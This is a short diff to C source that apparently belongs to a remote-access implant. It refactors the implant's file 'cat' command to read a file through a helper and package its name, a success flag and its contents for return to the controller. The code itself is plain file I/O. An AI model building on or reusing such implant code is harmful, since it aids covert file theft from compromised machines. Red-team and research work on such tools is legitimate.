@@ -1004,44 +1004,20 @@ VOID CommandFS( PPARSER Parser )
         case DEMON_COMMAND_FS_CAT: PUTS( "FS::Cat" )
         {
             DWORD  FileSize = 0;
-            DWORD  Read     = 0;
             DWORD  NameSize = 0;
             LPWSTR FileName = ParserGetBytes( Parser, &NameSize );
-            HANDLE hFile    = NULL;
             PVOID  Content  = NULL;
+            BOOL   Success  = FALSE;
 
-            FileName[ NameSize ] = 0;
+            PRINTF( "FileName => %ls\n", FileName )
 
-            PRINTF( "FileName => %ls", FileName )
-
-            hFile = Instance.Win32.CreateFileW( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
-            if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
-            {
-                PUTS( "CreateFileW: Failed" )
-                CALLBACK_GETLASTERROR
-                goto CleanupCat;
-            }
-
-            FileSize = Instance.Win32.GetFileSize( hFile, 0 );
-            Content  = Instance.Win32.LocalAlloc( LPTR, FileSize );
-
-            if ( ! Instance.Win32.ReadFile( hFile, Content, FileSize, &Read, NULL ) )
-            {
-                PUTS( "ReadFile: Failed" )
-                CALLBACK_GETLASTERROR
-                goto CleanupDownload;
-            }
+            Success = ReadLocalFile( FileName, &Content, &FileSize );
 
             PackageAddBytes( Package, FileName, NameSize );
+            PackageAddInt32( Package, Success );
             PackageAddBytes( Package, Content,  FileSize );
 
         CleanupCat:
-            if ( hFile )
-            {
-                Instance.Win32.NtClose( hFile );
-                hFile = NULL;
-            }
-
             if ( Content )
             {
                 MemSet( Content, 0, FileSize );
